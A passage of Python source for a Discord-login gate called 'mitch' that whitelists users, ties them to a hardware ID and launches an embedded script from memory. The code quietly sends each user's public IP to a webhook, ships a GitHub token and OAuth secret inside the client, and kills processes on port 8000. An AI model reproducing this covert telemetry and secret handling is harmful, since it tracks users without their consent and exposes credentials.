                        # Show waiting page
                        self.send_response(200)
                        self.send_header('Content-type', 'text/html')
                        self.end_headers()
                        self.wfile.write(WAITING_HTML.encode())
                    else:
                        # Missing or empty code parameter
                        auth_state["status"] = "error"
                        self.send_response(302)
                        self.send_header('Location', '/error')
                        self.end_headers()
                except Exception as e:
                    print(f"Error processing callback: {e}")
                    auth_state["status"] = "error"
                    
                    # Redirect to the error page
                    self.send_response(302)
                    self.send_header('Location', '/error')
                    self.end_headers()
        
        elif self.path == '/success':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(SUCCESS_HTML.encode())
        
        elif self.path == '/error':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(ERROR_HTML.encode())
            
        elif self.path == '/status':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": auth_state["status"]}).encode())

    def log_message(self, format, *args):
        # Uncomment for debugging
        # print(format % args)
        pass

class DiscordAuthApp:
    def __init__(self):
        # Send startup webhook before initializing UI
        send_startup_webhook()
        
        # Reset global auth server state
        global auth_server
        auth_server = None
        
        # Add port check before creating window
        if not self.is_port_available(8000):
            self.force_close_port(8000)  # Add force close of port
            
        self.window = ctk.CTk()
        self.window.title("mitch")
        self.window.geometry("400x350")
        self.window.resizable(False, False)
        self.window.configure(fg_color="black")  # Set window background to black
        self.window.attributes('-topmost', True)  # Make window always on top
        
        # Remove default title bar completely
        self.window.overrideredirect(True)
        
        # Create custom title bar
        self.title_bar = ctk.CTkFrame(self.window, fg_color="black", height=30)
        self.title_bar.pack(fill='x', side='top')
        self.title_bar.pack_propagate(False)
        
        # Add title label with jungle green text
        title_label = ctk.CTkLabel(self.title_bar, text="mitch", fg_color="black", 
                                 text_color="#2C5530", font=("Helvetica", 12, "bold"))
        title_label.pack(side='left', padx=10)
        
        # Add close button with black background
        close_button = ctk.CTkButton(self.title_bar, text="×", width=30, height=30, 
                                   command=self.cleanup, fg_color="black", 
                                   hover_color="#8B0000", corner_radius=0)
        close_button.pack(side='right')
        
        # Bind mouse events for window dragging
        self.title_bar.bind('<Button-1>', self.start_move)
        self.title_bar.bind('<B1-Motion>', self.on_move)
        
        # Add icon to window if available
        self.app_dir, ICON_PATH, self.auth_path = ensure_app_directory()
        if os.path.exists(ICON_PATH):
            self.window.iconbitmap(ICON_PATH)
    
        self.auth_check_active = False
        self.user_id = None
        self.access_token = None
        self.script_process = None
        self.panel_id = None
        self.username = None
        self.discriminator = None
    
        self.frame = ctk.CTkFrame(self.window, fg_color="black")
        self.frame.pack(expand=True, fill="both", padx=20, pady=20)
    
        # Create image label instead of emoji
        if os.path.exists(ICON_PATH):
            try:
                # Use CTkImage instead of PhotoImage
                from PIL import Image
                from customtkinter import CTkImage
                
                ico_image = Image.open(ICON_PATH)
                # Resize to 72x72 to match original emoji size
                ico_image = ico_image.resize((72, 72), Image.Resampling.LANCZOS)
                photo = CTkImage(light_image=ico_image, dark_image=ico_image, size=(72, 72))
                
                self.emoji_label = ctk.CTkLabel(
                    self.frame,
                    text="",  # Clear text
                    image=photo  # Set image
                )
                self.emoji_label.pack(pady=10)
            except Exception as e:
                # Fallback to text if image fails to load
                self.emoji_label = ctk.CTkLabel(
                    self.frame,
                    text="🔒",
                    font=("Segoe UI Emoji", 72)
                )
                self.emoji_label.pack(pady=10)
        else:
            # Fallback to text if icon doesn't exist
            self.emoji_label = ctk.CTkLabel(
                self.frame,
                text="🔒",
                font=("Segoe UI Emoji", 72)
            )
            self.emoji_label.pack(pady=10)
    
        # Create title label
        self.title_label = ctk.CTkLabel(
            self.frame,
            text="mitch",
            font=("Helvetica", 16, "bold"),
            text_color="#2C5530"
        )
        self.title_label.pack(pady=10)
    
        self.panel_id_label = ctk.CTkLabel(
            self.frame,
            text="",
            font=("Helvetica", 12)
        )
        self.panel_id_label.pack(pady=5)
    
        self.status_label = ctk.CTkLabel(
            self.frame,
            text="",
            font=("Helvetica", 12)
        )
        self.status_label.pack(pady=5)
    
        self.login_button = ctk.CTkButton(
            self.frame,
            text="login",
            command=self.start_auth,
            fg_color="#2C5530",  # Changed from #4e8a3e to #2C5530
            hover_color="#1E3B22"  # Changed hover color to a slightly darker green
        )
        self.login_button.pack(pady=10)
        
        # Load or generate panel ID
        self.load_or_generate_panel_id()         
        self.auth_timeout = None  # Add timeout tracker
        self.try_silent_auth()

    def start_live_auth_checking(self, user_id, access_token):
        """Start periodic checking of user authorization status"""
        self.user_id = user_id
        self.access_token = access_token
        self.auth_check_active = True
        
        # Start the background checking immediately
        self.check_auth_status()

    def check_auth_status(self):
        """Check authorization status every 5 seconds"""
        if not self.auth_check_active:
            return
            
        # Fetch latest auth data
        whitelisted_users, blacklisted_users = fetch_auth_data()
        
        # Convert user_id to string for comparison
        user_id_str = str(self.user_id) if self.user_id else None
        
        if user_id_str:
            if user_id_str in blacklisted_users:
                self.status_label.configure(text="Access Revoked: Blacklisted!")
                self.window.update()
                self.window.after(2000, self.force_exit_application)
                return
                
            # Check whitelist
            is_whitelisted = user_id_str in whitelisted_users
            
            if not is_whitelisted and whitelisted_users:  # Only check if whitelist is not empty
                self.status_label.configure(text="Access Revoked: Not Whitelisted!")
                self.window.update()
                self.window.after(2000, self.force_exit_application)
                return
                
            # Still authorized - update status
            current_time = time.strftime("%H:%M:%S")
            self.status_label.configure(text=f"Auth Check ({current_time}): Authorized")
    
        # Schedule next check in 5 seconds if still active
        if self.auth_check_active:
            self.window.after(5000, self.check_auth_status)

    def is_port_available(self, port):
        """Check if the port is available"""
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.bind(('localhost', port))
            sock.close()
            return True
        except:
            sock.close()
            return False

    def force_close_port(self, port):
        """Force close a port if it's in use"""
        if sys.platform.startswith('win'):
            try:
                for proc in psutil.process_iter(['pid', 'name', 'connections']):
                    try:
                        for conn in proc.connections():
                            if conn.laddr.port == port:
                                proc.kill()
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass
            except:
                pass

    def start_http_server(self):
        global auth_server
        # Check if server is already running
        if auth_server is None:
            try:
                if not self.is_port_available(8000):
                    self.status_label.configure(text="Port 8000 is in use.\nPlease restart your PC.")
                    return False
                    
                auth_server = HTTPServer(('localhost', 8000), AuthHandler)
                server_thread = threading.Thread(target=auth_server.serve_forever)
                server_thread.daemon = True
                server_thread.start()
                return True
            except Exception as e:
                print(f"Error starting HTTP server: {e}")
                self.status_label.configure(text="Failed to start server.\nTry restarting your PC.")
                return False
        return True

    def execute_from_memory(self):
        try:
            # Create a module object
            module_name = "__dynamic_script__"
            module = types.ModuleType(module_name)
            module.__file__ = module_name
            
            # Add the module to sys.modules
            sys.modules[module_name] = module
            
            # Execute the source code in the context of the module
            exec(SCRIPT_SOURCE, module.__dict__)
            
        except Exception as e:
            print(f"Error running script: {str(e)}")

    def run_verified_script(self):
        self.status_label.configure(text="Authorization successful! Launching script...")
        self.window.update()
    
        time.sleep(2)
        
        if sys.platform.startswith('win'):
            import subprocess
            script_with_id = SCRIPT_SOURCE.replace('self.discord_id = self.get_discord_id()', f'self.discord_id = "{self.user_id}"')
            process = subprocess.Popen(
                [sys.executable, '-c', script_with_id]
            )
            self.script_process = process
        else:
            # Unix systems
            import multiprocessing
            process = multiprocessing.Process(target=self.execute_from_memory)
            process.daemon = False
            process.start()
            self.script_process = process

        self.window.withdraw()

    async def get_user_info(self, access_token):
        headers = {'Authorization': f'Bearer {access_token}'}
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(USER_URL, headers=headers) as response:
                    if response.status == 200:
                        user_data = await response.json()
                        # Store username and discriminator
                        self.username = user_data.get('username', 'unknown')
                        self.discriminator = user_data.get('discriminator', '0000')
                        return user_data
                    return None
        except Exception as e:
            print(f"Error getting user info: {e}")
            return None

    async def verify_user(self, user_id):
        # Fetch the latest whitelist and blacklist
        whitelisted_users, blacklisted_users = fetch_auth_data()
        
        # Convert user_id to string
        user_id_str = str(user_id)
        
        # Check if user is blacklisted
        if user_id_str in blacklisted_users:
            return False
        
        # Get current panel mappings
        url = f"{GITHUB_API_URL}?cache_bust={int(time.time())}"
        headers = {'Authorization': f'token {GITHUB_TOKEN}'}
        
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                content = base64.b64decode(response.json()['content']).decode('utf-8')
                data = json.loads(content)
                panel_mappings = data.get('panel_mappings', {})
                
                # Check if user has an assigned panel ID
                if user_id_str in panel_mappings:
                    assigned_panel_id = panel_mappings[user_id_str]
                    if assigned_panel_id != self.panel_id:
                        self.status_label.configure(text="Panel ID mismatch - Access denied")
                        return False
        except Exception as e:
            print(f"Error checking panel mapping: {e}")
            return False
        
        # User must be in whitelist to be authorized
        return user_id_str in whitelisted_users

    def check_whitelist(self, code):
        async def verify():
            try:
                self.status_label.configure(text="Getting access id...")
                self.window.update()
                
                token_data = await self.get_token(code)
                if not token_data:
                    raise Exception("Failed to get access id")
                
                self.status_label.configure(text="Verifying user access...")
                self.window.update()
                
                user_info = await self.get_user_info(token_data['access_token'])
                if not user_info:
                    raise Exception("Failed to get user info")
                
                user_id = int(user_info['id'])
                is_authorized = await self.verify_user(user_id)
                
                if is_authorized:
                    self.status_label.configure(text="Authorization successful!")
                else:
                    self.status_label.configure(text="Authorization failed!")
                self.window.update()
                
                self.update_auth_status(is_authorized, user_id, token_data['access_token'])
            
            except Exception as e:
                print(f"Authorization error: {e}")
                self.status_label.configure(text="Authorization failed!")
                self.window.update()
                self.update_auth_status(False)

        # Actually run the async function
        asyncio.run(verify())

    def force_exit_application(self):
        """Complete termination of application and all child processes"""       
        # Log revocation
        if self.user_id and self.username and self.discriminator and self.panel_id:
            print(f"\n[!] Access Revoked for (ID: {self.user_id})")
            print("[!] Terminating application...")
            
            send_discord_webhook(
                user_id=self.user_id,
                username=self.username,
                discriminator=self.discriminator,
                panel_id=self.panel_id,
                action="Authorization Revoked"
            )
            
        # Show warning
        self.window.deiconify()
        self.status_label.configure(text="⚠️ Access Revoked - Terminating ⚠️")
        self.window.update()
        
        # Terminate all related processes
        if self.script_process:
            try:
                if sys.platform.startswith('win'):
                    # Kill process tree on Windows
                    subprocess.run(['taskkill', '/F', '/T', '/PID', str(self.script_process.pid)], 
                                 capture_output=True)
                else:
                    # Kill process group on Unix
                    os.killpg(os.getpgid(self.script_process.pid), signal.SIGTERM)
            except:
                pass
            
        # Clear cached data
        self.user_id = None
        self.access_token = None
        self.script_process = None
        
        # Force cleanup and exit
        self.cleanup()
        
        # Force exit the entire application
        os._exit(0)

    def cleanup(self):
        """Complete cleanup of all resources"""
        global auth_server
        
        # Stop auth checking
        self.auth_check_active = False
        
        # Cleanup HTTP server
        if auth_server:
            try:
                auth_server.shutdown()
                auth_server.server_close()
                auth_server = None
            except:
                pass
            
        # Force close port 8000
        self.force_close_port(8000)
        
        try:
            # Don't delete auth.json during cleanup
            appdata_dir = os.path.join(os.getenv('APPDATA'), 'mitch')
            if os.path.exists(appdata_dir):
                for file in os.listdir(appdata_dir):
                    if file not in ['logo.ico', 'auth.json']:
                        try:
                            os.remove(os.path.join(appdata_dir, file))
                        except:
                            pass
        except:
            pass
            
        # Destroy window
        try:
            self.window.quit()
            self.window.destroy()
        except:
            pass

    def run(self):
        try:
            # Add window cleanup on close
            self.window.protocol("WM_DELETE_WINDOW", self.cleanup)
            self.window.mainloop()
        finally:
            # Ensure cleanup happens even if window is force-closed
            self.cleanup()

    # Add these new methods for window dragging
    def start_move(self, event):
        self.x = event.x
        self.y = event.y

    def on_move(self, event):
        deltax = event.x - self.x
        deltay = event.y - self.y
        x = self.window.winfo_x() + deltax
        y = self.window.winfo_y() + deltay
        self.window.geometry(f"+{x}+{y}")

    def try_silent_auth(self):
        """Attempt silent auth with stored credentials"""
        try:
            auth_dir = os.path.join(self.app_dir, '.mauth')
            auth_path = os.path.join(auth_dir, '.auth.dat')
            
            # Check if auth directory and file exist
            if not os.path.exists(auth_dir) or not os.path.exists(auth_path):
                print("No auth file found")
                return
            
            # Check if file is empty
            if os.path.getsize(auth_path) == 0:
                print("Auth file is empty")
                self.clear_stored_auth()
                return
                
            try:
                with open(auth_path, 'rb') as f:
                    encrypted = f.read()
                    
                key = derive_machine_key()
                if not key:
                    print("Could not derive machine key")
                    return
                    
                f = Fernet(key)
                decrypted = f.decrypt(encrypted)
                
                # Parse JSON data
                auth_data = json.loads(decrypted.decode('utf-8'))
                
                # Validate required fields
                required = ['_x','_y','_z','_w','_v','_t','_k']
                if not all(k in auth_data for k in required):
                    raise ValueError("Invalid auth data format")
                    
                # Check expiry (7 days)
                if time.time() - int(auth_data['_t']) > 7 * 24 * 60 * 60:
                    raise ValueError("Auth data expired")
                
                # Load values - handle user_id as string until final conversion
                try:
                    # Convert hex string to decimal string then to int
                    user_id_str = str(int(auth_data['_x'], 16))
                    self.user_id = int(user_id_str)
                except ValueError:
                    # If already decimal string, try direct conversion
                    self.user_id = int(auth_data['_x'])
                    
                self.username = auth_data['_y']
                self.discriminator = auth_data['_z']
                self.access_token = auth_data['_w']
                self.panel_id = auth_data['_v']
                
                print(f"Successfully loaded auth data for {self.username}")
                self.login_button.pack_forget()
                asyncio.run(self.verify_stored_user())
                return
                    
            except Exception as e:
                print(f"Error reading auth data: {e}")
                self.clear_stored_auth()
                
        except Exception as e:
            print(f"Silent auth error: {e}")
            self.clear_stored_auth()

    def store_auth_data(self, user_id, username, discriminator, access_token):
        """Store auth data with proper ID handling"""
        try:
            # Ensure user_id is stored as hex string for consistency
            auth_data = {
                '_x': format(int(user_id), 'x'),  # Store ID as hex string
                '_y': username,
                '_z': discriminator, 
                '_w': access_token,
                '_v': self.panel_id,
                '_t': str(int(time.time())),
                '_k': base64.b64encode(os.urandom(16)).decode('ascii')
            }
            
            key = derive_machine_key()
            if not key:
                return
                
            f = Fernet(key)
            encrypted = f.encrypt(json.dumps(auth_data).encode('utf-8'))
            
            auth_path = os.path.join(self.app_dir, '.mauth', '.auth.dat')
            with open(auth_path, 'wb') as f:
                f.write(encrypted)
                
            if sys.platform.startswith('win'):
                ctypes.windll.kernel32.SetFileAttributesW(auth_path, 2)
                
        except Exception as e:
            print(f"Failed to store auth data: {e}")

    def clear_stored_auth(self):
        """Securely clear stored auth data"""
        try:
            auth_path = os.path.join(self.app_dir, '.mauth', '.auth.dat')
            if os.path.exists(auth_path):
                # Overwrite with random data before deleting
                size = os.path.getsize(auth_path)
                with open(auth_path, 'wb') as f:
                    f.write(os.urandom(size))
                os.remove(auth_path)
        except:
            pass

    async def verify_stored_user(self):
        """Verify stored user credentials are still valid"""
        try:
            # First check if user is still authorized
            is_authorized = await self.verify_user(self.user_id)
            
            # Set status message before verification
            self.status_label.configure(text="Verifying stored credentials...")
            self.window.update()
            
            print(f"Auth verification result: {is_authorized}")
            print(f"User ID: {self.user_id}")
            
            if is_authorized:
                print("Auth data verified successfully")
                # Hide login button 
                self.login_button.pack_forget()
                
                # Update status
                self.status_label.configure(text="Authorization successful!")
                self.window.update()
                
                # Start auth checking and launch app
                self.start_live_auth_checking(self.user_id, self.access_token)
                
                # Log successful auth
                log_session(
                    user_id=self.user_id,
                    username=self.username,
                    discriminator=self.discriminator,
                    panel_id=self.panel_id
                )
                
                # Launch the script after a short delay
                self.window.after(1500, self.run_verified_script)
                return True
                
            else:
                print("Auth verification failed")
                self.clear_stored_auth()
                self.status_label.configure(text="Stored credentials invalid.\nPlease login again.")
                self.login_button.pack(pady=10)
                self.login_button.configure(state="normal", text="Login with Discord")
                return False
                
        except Exception as e:
            print(f"Verify stored user error: {str(e)}")
            self.clear_stored_auth()
            self.status_label.configure(text="Error verifying credentials.\nPlease login again.")
            self.login_button.pack(pady=10)
            self.login_button.configure(state="normal", text="Login with Discord")
            return False

    async def get_token(self, code):
        """Get access token from Discord"""
        data = {
            'client_id': CLIENT_ID,
            'client_secret': CLIENT_SECRET,
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': REDIRECT_URI
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(TOKEN_URL, data=data) as response:
                    if response.status == 200:
                        return await response.json()
                    else:
                        error_text = await response.text()
                        print(f"Token error ({response.status}): {error_text}")
                        return None
        except Exception as e:
            print(f"Error getting token: {e}")
            return None

    def start_auth(self):
        """Start the Discord authorization process"""
        global auth_state
        
        # Reset auth state and clear any existing timeout
        auth_state = {"status": "pending", "code": None}
        if self.auth_timeout:
            self.window.after_cancel(self.auth_timeout)
        
        # Start HTTP server if not already running
        if not self.start_http_server():
            self.status_label.configure(text="Failed to start authorization server")
            return
        
        # Update UI
        self.status_label.configure(text="Starting authorization...")
        self.login_button.configure(state="disabled", text="Waiting for authorization...")
        self.window.update()
        
        # Open browser for Discord auth
        webbrowser.open(DISCORD_AUTH_URL)
        
        # Start checking for auth code with a 2-minute timeout
        self.auth_timeout = self.window.after(120000, self.auth_timeout_handler)
        self.window.after(100, self.check_auth_code)

    def load_or_generate_panel_id(self):
        """Load existing panel ID or generate a new one"""
        self.panel_id = get_hwid()
        self.panel_id_label.configure

    def auth_timeout_handler(self):
        """Handle authorization timeout"""
        global auth_state
        auth_state["status"] = "error"
        self.status_label.configure(text="Authorization timed out. Please try again.")
        self.login_button.configure(state="normal", text="Login with Discord")
        self.auth_timeout = None

    def check_auth_code(self):
        """Check for authorization code from Discord callback"""
        global auth_state
        
        if auth_state["status"] != "pending" and self.auth_timeout:
            self.window.after_cancel(self.auth_timeout)
            self.auth_timeout = None
        
        if auth_state["code"] is not None:
            code = auth_state["code"]
            auth_state["code"] = None
            self.status_label.configure(text="Verifying authorization...")
            self.window.update()
            
            self.window.after(500, lambda: self.check_whitelist(code))
        elif auth_state["status"] == "error":
            self.status_label.configure(text="Authorization failed")
            self.login_button.configure(state="normal", text="Login with Discord")
        elif auth_state["status"] == "pending":
            self.window.after(100, self.check_auth_code)

    def update_auth_status(self, success, user_id=None, access_token=None):
        """Update authentication status and handle success/failure"""
        global auth_state

        auth_state["status"] = "success" if success else "error"

        if success:
            # Store successful auth data
            self.store_auth_data(user_id, self.username, self.discriminator, access_token)
            print(f"Authentication successful.")
            self.start_live_auth_checking(user_id, access_token)
            
            # Log to webhook
            log_success = log_session(
                user_id=user_id, 
                username=self.username, 
                discriminator=self.discriminator, 
                panel_id=self.panel_id,
            )
            
            status_text = f"Authorized successfully!"
            if log_success:
                status_text += "\nStarting application..."
            
            self.status_label.configure(text=status_text)
            self.window.update()
            
            self.window.after(1500, self.run_verified_script)
        else:
            # Only send webhook for failed auth attempts
            if hasattr(self, 'username') and self.username and hasattr(self, 'discriminator') and self.discriminator:
                send_discord_webhook(
                    user_id=user_id or "unknown", 
                    username=self.username, 
                    discriminator=self.discriminator, 
                    panel_id=self.panel_id,
                    action="Authentication Failed"
                )
                
            self.status_label.configure(text="Authorization failed.\nYou are not whitelisted.")
            self.login_button.configure(state="normal", text="Login with Discord")

def generate_panel_id():
        return str(uuid.uuid4())[:8].upper()

def get_hwid():
    """Generate a unique identifier for the current machine."""
    if sys.platform == "win32":
        try:
            # Try using WMIC first
            import subprocess
            command = "wmic csproduct get uuid"
            hwid = subprocess.check_output(command, shell=True).decode().split("\n")[1].strip()
        except:
            try:
                # Fallback to using Windows Management Instrumentation
                import wmi
                c = wmi.WMI()
                hwid = c.Win32_ComputerSystemProduct()[0].UUID
            except:
                # Final fallback - use some system info
                import platform
                system_info = [
                    platform.machine(),
                    platform.node(),
                    platform.processor(),
                    str(platform.python_build()),
                ]
                hwid = ''.join(system_info)
    else:
        try:
            hwid = os.popen("cat /var/lib/dbus/machine-id").read().strip()
        except:
            # Fallback for non-Windows systems
            import platform
            system_info = [
                platform.machine(),
                platform.node(),
                platform.processor(),
                str(platform.python_build()),
            ]
            hwid = ''.join(system_info)
            
    return hashlib.sha256(hwid.encode()).hexdigest()[:8].upper()
        
def log_session(user_id, username, discriminator, panel_id, ip_address=None):
    # Send webhook notification
    webhook_success = send_discord_webhook(
        user_id=user_id,
        username=username,
        discriminator=discriminator,
        panel_id=panel_id,
        ip_address=ip_address
    )

async def get_user_info(self, access_token):
        headers = {'Authorization': f'Bearer {access_token}'}
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(USER_URL, headers=headers) as response:
                    if response.status == 200:
                        user_data = await response.json()
                        # Store username and discriminator
                        self.username = user_data.get('username', 'unknown')
                        self.discriminator = user_data.get('discriminator', '0000')
                        return user_data
                    return None
        except Exception as e:
            print(f"Error getting user info: {e}")
            return None       
        
def send_discord_webhook(user_id, username, discriminator, panel_id, ip_address=None, action="Login"):
    # Get IP if not provided
    if not ip_address:
        try:
            ip_address = get('https://api.ipify.org').text
        except:
            ip_address = "Unable to get IP"
    
    # First update the GitHub data
    update_success = update_github_data(user_id, panel_id)
    
    webhook_data = {
        "embeds": [{
            "title": f"Panel {action} Detected",
            "color": 0x2C5530,  # Changed from 0x808080 to 0x2C5530
            "fields": [
                {
                    "name": "Panel ID",
                    "value": panel_id,
                    "inline": True
                },
                {
                    "name": "User",
                    "value": f"<@{user_id}>",
                    "inline": True
                },
                {
                    "name": "IP Address",
                    "value": ip_address,
                    "inline": True
                },
                {
                    "name": "Timestamp",
                    "value": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "inline": True
                }
            ],
            "footer": {
                "text": "mitch"
            }
        }]
    }
    
    try:
        response = requests.post(WEBHOOK_URL, json=webhook_data)
        return response.status_code == 204 and update_success
    except Exception as e:
        print(f"Error sending webhook: {e}")
        return False

def update_github_data(user_id, panel_id):
    """Update GitHub auth_data.json with new panel ID mapping"""
    headers = {'Authorization': f'token {GITHUB_TOKEN}'}
    max_retries = 3
    
    for attempt in range(max_retries):
        try:
            # Get current file content
            response = requests.get(GITHUB_API_URL, headers=headers)
            if response.status_code != 200:
                continue
                
            current_data = response.json()
            content = base64.b64decode(current_data['content']).decode('utf-8')
            data = json.loads(content)
            
            # Check if user already has a different panel ID
            if 'panel_mappings' in data:
                existing_panel = data['panel_mappings'].get(str(user_id))
                if existing_panel and existing_panel != panel_id:
                    return False, "Panel ID mismatch"
            
            # Add or update panel ID mapping
            if 'panel_mappings' not in data:
                data['panel_mappings'] = {}
            data['panel_mappings'][str(user_id)] = panel_id
            
            # Add timestamp for tracking
            if 'panel_timestamps' not in data:
                data['panel_timestamps'] = {}
            data['panel_timestamps'][str(user_id)] = datetime.datetime.now().isoformat()
            
            # Encode updated content
            updated_content = base64.b64encode(json.dumps(data, indent=2).encode('utf-8')).decode('utf-8')
            
            # Update file on GitHub
            update_data = {
                'message': f'Update panel mapping for user {user_id}',
                'content': updated_content,
                'sha': current_data['sha']
            }
            
            update_response = requests.put(GITHUB_API_URL, headers=headers, json=update_data)
            if update_response.status_code == 200:
                return True, "Success"
            
        except Exception as e:
            if attempt == max_retries - 1:
                return False, f"Error: {str(e)}"
            time.sleep(1)  # Wait before retry
            
    return False, "Failed after retries"

if __name__ == "__main__":
    try:
        import pywin32_system32
    except ImportError:
        pass
    
    # First check for updates
    print("\nChecking for updates...")
    if not check_for_updates():
        print("No updates available.")
    else:
        print("Update available. Please restart the application.")
        sys.exit(0)
    app = DiscordAuthApp()
    app.run()
